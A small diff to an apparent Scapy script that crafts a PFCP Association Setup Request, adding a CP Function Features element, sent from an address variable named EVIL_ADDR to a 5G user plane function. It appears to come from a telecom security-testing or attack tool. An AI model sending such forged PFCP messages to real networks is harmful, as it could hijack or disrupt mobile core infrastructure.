@@ -21,7 +21,10 @@ def send_pfcp_association_setup_req():
         seid=0,
         S=0,
         seq=seq
-    )/node_id/recovery_timestamp
+    )/node_id/recovery_timestamp/IE_CPFunctionFeatures(
+        OVRL=0, LOAD=0
+    )
+
 
     packet = IP(src=EVIL_ADDR, dst=UPF_ADDR)/UDP(sport=8805, dport=8805)/pfcp_msg
     print("PFCP Association Setup packet:", packet.show())
